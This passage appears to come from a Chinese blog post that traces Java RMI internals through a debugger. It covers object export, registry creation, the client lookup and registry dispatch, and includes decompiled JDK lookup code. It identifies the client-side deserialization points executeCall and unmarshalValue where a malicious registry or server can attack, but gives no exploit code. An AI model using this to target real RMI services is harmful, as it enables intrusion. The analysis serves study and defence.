<p>这个线程开启之后等待客户端的连接</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058990.png" style="max-width: 100%; height: auto;"></p>
<p>做完这些之后，用 MAP 表储存 target，target 中包括了 IP、端口、服务端代理、客户端代理等信息</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058314.png" style="max-width: 100%; height: auto;"></p>
<p>最后返回一些值，完成了服务端的发布过程。</p>
<p>到这里在返回看 <strong>exportObject 函数的作用</strong>：</p>
<ul>
<li>静态方法的 <!-- raw HTML omitted -->exportObject 传入俩个参数，创建一个 UnicastServerRef 对象 sref ，sref 中封装了IP、端口等信息，核心是 LiveRef@xxx，然后调用 exportObject(obj, sref)<!-- raw HTML omitted --></li>
<li><!-- raw HTML omitted -->重载方法的 exportObject 返回代理对象 stub<!-- raw HTML omitted --></li>
<li>这样就做到了把一个本地的远程对象实例导出成一个可以远程访问的对象</li>
</ul>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058084.png" style="max-width: 100%; height: auto;"></p>
<h3 id="32-注册中心-创建注册中心绑定">3.2 注册中心-创建注册中心+绑定<a hidden class="anchor" aria-hidden="true" href="#32-注册中心-创建注册中心绑定">#</a></h3>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058089.png" style="max-width: 100%; height: auto;"></p>
<p>调用 createRegistry  创建注册中心，默认端口号为1099</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058574.png" style="max-width: 100%; height: auto;"></p>
<p>到了这一步点“恢复程序”，如果继续跟进去会发现一堆奇怪的东西</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059987.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806502.png" style="max-width: 100%; height: auto;"></p>
<p>来到这一步：</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059539.png" style="max-width: 100%; height: auto;"></p>
<p>创建了一个 LiveRef，一个 lref，（这里的作用和服务端的实际上是一样的）</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059580.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059524.png" style="max-width: 100%; height: auto;"></p>
<h3 id="33-客户端-请求注册中心">3.3 客户端-请求注册中心<a hidden class="anchor" aria-hidden="true" href="#33-客户端-请求注册中心">#</a></h3>
<p>首先连接注册中心，接收传入的IP和端口</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059631.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059585.png" style="max-width: 100%; height: auto;"></p>
<p>使用LIveRef ，将传入的 host,port,等封装</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059455.png" style="max-width: 100%; height: auto;"></p>
<p>再次调用 <!-- raw HTML omitted -->createProxy 方法，同样的创建了 stub ，（这里的创建是通过注册中心传入参数（host,port..），客户端自行创建 stub）<!-- raw HTML omitted --></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059526.png" style="max-width: 100%; height: auto;"></p>
<p>来到下一步：</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806495.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059518.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059247.png" style="max-width: 100%; height: auto;"></p>
<h4 id="问题在动态调试时遇到报错可能是服务端没有开启">问题：在动态调试时遇到报错，可能是服务端没有开启！<a hidden class="anchor" aria-hidden="true" href="#问题在动态调试时遇到报错可能是服务端没有开启">#</a></h4>
<p>下一步调用会报以下错误，因为服务端没有开启监听</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100821.png" style="max-width: 100%; height: auto;"></p>
<p>将 RMIServer 运行起来就可以了</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059422.png" style="max-width: 100%; height: auto;"></p>
<p>这里看到传进来的 var1 实际上就是<code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code>中的 <code>remoteObj</code></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100050.png" style="max-width: 100%; height: auto;"></p>
<div class="code-block-container" id="code-1769750397274121200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397274121200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397274121200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397274121200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397274121200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="nf">lookup</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">AccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NotBoundException</span><span class="p">,</span><span class="w"> </span><span class="n">RemoteException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//创建远程调用对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RemoteCall</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">ref</span><span class="p">.</span><span class="na">newCall</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">operations</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="n">4905912898345647071L</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//序列化参数，将 var1 写入输出流</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var3</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">var1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var18</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var18</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//发起远程调用，</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">ref</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">var2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Remote</span><span class="w"> </span><span class="n">var23</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">///从输入流中读取远程 registry 返回的对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var23</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Remote</span><span class="p">)</span><span class="n">var6</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var15</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var15</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var16</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var16</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">super</span><span class="p">.</span><span class="na">ref</span><span class="p">.</span><span class="na">done</span><span class="p">(</span><span class="n">var2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">var23</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">RuntimeException</span><span class="w"> </span><span class="n">var19</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="n">var19</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">RemoteException</span><span class="w"> </span><span class="n">var20</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="n">var20</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">NotBoundException</span><span class="w"> </span><span class="n">var21</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="n">var21</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">var22</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnexpectedException</span><span class="p">(</span><span class="s">&#34;undeclared checked exception&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var22</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>跟进 <strong>invoke</strong></p>
<p><strong>super.ref.invoke(var2);</strong></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100488.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100413.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100826.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100956.png" style="max-width: 100%; height: auto;"></p>
<p>StreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法</p>
<p><strong>executeCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。</strong></p>
<p><strong>由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免</strong></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100633.png" style="max-width: 100%; height: auto;"></p>
<p>这里的 lookup 方法的作用就是去注册中心查找远程对象</p>
<h3 id="34-客户端-请求服务端">3.4 客户端-请求服务端<a hidden class="anchor" aria-hidden="true" href="#34-客户端-请求服务端">#</a></h3>
<p><strong>同样注意开启服务端</strong></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100785.png" style="max-width: 100%; height: auto;"></p>
<p>来到了 invoke</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100700.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100902.png" style="max-width: 100%; height: auto;"></p>
<p>这里又跟到了 StreamRemoteCall ，这样的请求同样可以被攻击</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100629.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101578.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100270.png" style="max-width: 100%; height: auto;"></p>
<p>结束 <!-- raw HTML omitted -->call.executeCall(); 后会出现另一个反序列化点<!-- raw HTML omitted --></p>
<p>进入 <strong>unmarshalValue</strong></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101064.png" style="max-width: 100%; height: auto;"></p>
<p><strong>unmarshalValue 函数的作用就是根据目标类型，选择正确的方式从输入流中读取数据</strong>。</p>
<ul>
<li>对基本类型，用专门的 <code>readxxx()</code> 方法读取，再返回</li>
<li>对对象类型，直接调用 <code>readObject()</code> 反序列化</li>
</ul>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250807873.png" style="max-width: 100%; height: auto;"></p>
<p>returnValue 返回了 &ldquo;HELLO&rdquo;</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101630.png" style="max-width: 100%; height: auto;"></p>
<h4 id="总结-客户端产生的反序列化漏洞点">总结-客户端产生的反序列化漏洞点<a hidden class="anchor" aria-hidden="true" href="#总结-客户端产生的反序列化漏洞点">#</a></h4>
<ol>
<li>StreamRemoteCall.executeCall</li>
</ol>
<p>StreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法</p>
<p><strong>executeCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。</strong></p>
<p><strong>由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免</strong></p>
<hr>
<p>executeCall 处理的协议就是<strong>JRMP 协议</strong></p>
<ol start="2">
<li>unmarshalValue</li>
</ol>
<p>unmarshalValue 函数向服务端请求获取返回值时，返回值是通过反序列化产生的。</p>
<h3 id="35-注册中心-客户端请求时">3.5 注册中心-客户端请求时<a hidden class="anchor" aria-hidden="true" href="#35-注册中心-客户端请求时">#</a></h3>
<p>前面说过，服务端创建了 stub 并将信息封装到 target，随后的 NewThreadAction 创建了一个新的线程，等待客户端的响应</p>
<blockquote>
<p>这个线程开启之后等待客户端的连接</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101934.png" style="max-width: 100%; height: auto;"></p>
</blockquote>
<p>现在进入创建线程的流程：</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101994.png" style="max-width: 100%; height: auto;"></p>
<p>进入 run() 后，只能调用 <!-- raw HTML omitted -->executeAcceptLoop，executeAcceptLoop 又创建了一个新的线程<!-- raw HTML omitted --></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101732.png" style="max-width: 100%; height: auto;"></p>
<p>run 调用了 run0</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101959.png" style="max-width: 100%; height: auto;"></p>
<p>run0 前面都是在解析一些协议，重点是 <strong>handleMessages</strong></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101134.png" style="max-width: 100%; height: auto;"></p>
<p>其中的 默认情况是调用了 serviceCall</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102514.png" style="max-width: 100%; height: auto;"></p>
<p>serviceCall 会从表中获取 target</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102601.png" style="max-width: 100%; height: auto;"></p>
<p>此处断点调试：</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102239.png" style="max-width: 100%; height: auto;"></p>
<p>可以看到断点处的 stub 就是服务端创建好的东西</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102908.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102432.png" style="max-width: 100%; height: auto;"></p>
<p>之后会调用 disp.dispatch，disp 是一个分发器，用于将远程请求分发到服务端执行</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102528.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102834.png" style="max-width: 100%; height: auto;"></p>
<p>这里 skel 不为空就会调用 oldDispatch</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102594.png" style="max-width: 100%; height: auto;"></p>
<p><!-- raw HTML omitted -->skel.dispatch<!-- raw HTML omitted --></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102245.png" style="max-width: 100%; height: auto;"></p>
<p>而 <!-- raw HTML omitted -->skel.dispatch 是属于 RegistryImpl_Skel 类中的 dispatch<!-- raw HTML omitted --></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102876.png" style="max-width: 100%; height: auto;"></p>
<p>接下来就到了重点：</p>
<p><strong>RegistryImpl_Skel.class</strong></p>
<div class="code-block-container" id="code-1769750397288820100" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397288820100">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397288820100" title="Toggle" aria-expanded="false" aria-controls="code-1769750397288820100" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397288820100-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">  1</span>
</span><span class="lnt" id="2"><span class="lnlinks">  2</span>
</span><span class="lnt" id="3"><span class="lnlinks">  3</span>
</span><span class="lnt" id="4"><span class="lnlinks">  4</span>
</span><span class="lnt" id="5"><span class="lnlinks">  5</span>
</span><span class="lnt" id="6"><span class="lnlinks">  6</span>
</span><span class="lnt" id="7"><span class="lnlinks">  7</span>
</span><span class="lnt" id="8"><span class="lnlinks">  8</span>
</span><span class="lnt" id="9"><span class="lnlinks">  9</span>
</span><span class="lnt" id="10"><span class="lnlinks"> 10</span>
</span><span class="lnt" id="11"><span class="lnlinks"> 11</span>
</span><span class="lnt" id="12"><span class="lnlinks"> 12</span>
</span><span class="lnt" id="13"><span class="lnlinks"> 13</span>
</span><span class="lnt" id="14"><span class="lnlinks"> 14</span>
</span><span class="lnt" id="15"><span class="lnlinks"> 15</span>
</span><span class="lnt" id="16"><span class="lnlinks"> 16</span>
</span><span class="lnt" id="17"><span class="lnlinks"> 17</span>
</span><span class="lnt" id="18"><span class="lnlinks"> 18</span>
</span><span class="lnt" id="19"><span class="lnlinks"> 19</span>
</span><span class="lnt" id="20"><span class="lnlinks"> 20</span>
</span><span class="lnt" id="21"><span class="lnlinks"> 21</span>
</span><span class="lnt" id="22"><span class="lnlinks"> 22</span>
</span><span class="lnt" id="23"><span class="lnlinks"> 23</span>
</span><span class="lnt" id="24"><span class="lnlinks"> 24</span>
</span><span class="lnt" id="25"><span class="lnlinks"> 25</span>
</span><span class="lnt" id="26"><span class="lnlinks"> 26</span>
</span><span class="lnt" id="27"><span class="lnlinks"> 27</span>
</span><span class="lnt" id="28"><span class="lnlinks"> 28</span>
</span><span class="lnt" id="29"><span class="lnlinks"> 29</span>
</span><span class="lnt" id="30"><span class="lnlinks"> 30</span>
</span><span class="lnt" id="31"><span class="lnlinks"> 31</span>
</span><span class="lnt" id="32"><span class="lnlinks"> 32</span>
</span><span class="lnt" id="33"><span class="lnlinks"> 33</span>
</span><span class="lnt" id="34"><span class="lnlinks"> 34</span>
</span><span class="lnt" id="35"><span class="lnlinks"> 35</span>
</span><span class="lnt" id="36"><span class="lnlinks"> 36</span>
</span><span class="lnt" id="37"><span class="lnlinks"> 37</span>
</span><span class="lnt" id="38"><span class="lnlinks"> 38</span>
</span><span class="lnt" id="39"><span class="lnlinks"> 39</span>
</span><span class="lnt" id="40"><span class="lnlinks"> 40</span>
</span><span class="lnt" id="41"><span class="lnlinks"> 41</span>
</span><span class="lnt" id="42"><span class="lnlinks"> 42</span>
</span><span class="lnt" id="43"><span class="lnlinks"> 43</span>
</span><span class="lnt" id="44"><span class="lnlinks"> 44</span>
</span><span class="lnt" id="45"><span class="lnlinks"> 45</span>
</span><span class="lnt" id="46"><span class="lnlinks"> 46</span>
</span><span class="lnt" id="47"><span class="lnlinks"> 47</span>
</span><span class="lnt" id="48"><span class="lnlinks"> 48</span>
</span><span class="lnt" id="49"><span class="lnlinks"> 49</span>
